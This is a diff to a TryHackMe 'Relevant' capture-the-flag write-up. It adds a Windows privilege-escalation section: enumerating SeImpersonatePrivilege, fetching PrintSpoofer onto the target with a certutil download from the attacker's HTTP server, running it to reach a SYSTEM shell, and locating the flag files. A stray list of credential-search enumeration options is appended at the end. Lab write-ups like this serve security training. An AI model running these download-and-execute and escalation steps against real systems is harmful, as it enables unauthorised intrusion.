@@ -1,4 +1,4 @@
-# (THM)
+# Relevant (THM)
 
 - https://tryhackme.com/room/relevant
 - March 15, 2023
@@ -122,5 +122,71 @@ QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
 
 - find the nt4wrksv folder inside the system and it is here `c:\inetpub\wwwroot\nt4wrksv>`
 
+- `Systeminfo`
+
+```
+Host Name:                 RELEVANT
+OS Name:                   Microsoft Windows Server 2016 Standard Evaluation
+OS Version:                10.0.14393 N/A Build 14393
+```
+
+- privs
+
+```sh
+c:\windows\system32\inetsrv>whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+```
 
 ## Root Access
+
+- to get system access, I used this printspoofer.exe file
+- https://github.com/dievus/printspoofer/blob/master/PrintSpoofer.exe
+- download to local machine and transfer to exploit machine via python server
+
+- local machine
+
+```sh
+~/ctf_challenges/TryHackMe/relevant on  main! ⌚ 15:20:29
+$ python -m http.server 8888
+```
+
+- remote machine
+
+```
+c:\Users\Public\Downloads>certutil -urlcache -f http://10.11.8.57:8888/PrintSpoofer.exe ps.exe
+c:\Users\Public\Downloads>.\ps.exe -i -c cmd
+.\ps.exe -i -c cmd
+[+] Found privilege: SeImpersonatePrivilege
+[+] Named pipe listening...
+[+] CreateProcessAsUser() OK
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+```
+
+- flag files are in `C:\Users\Administrator\Desktop\root.txt` and `C:\Users\Bob\Desktop\user.txt`
+
+
+        domain               Enumerate domain information
+        systeminfo           Search system information
+        userinfo             Search user information
+        processinfo          Search processes information
+        servicesinfo         Search services information
+        applicationsinfo     Search installed applications information
+        networkinfo          Search network information
+        windowscreds         Search windows credentials
+        browserinfo          Search browser information
+        filesinfo            Search generic files that can contains credentials
+        fileanalysis         Search specific files that can contains credentials and for regexes inside files
+        eventsinfo           Display interesting events information
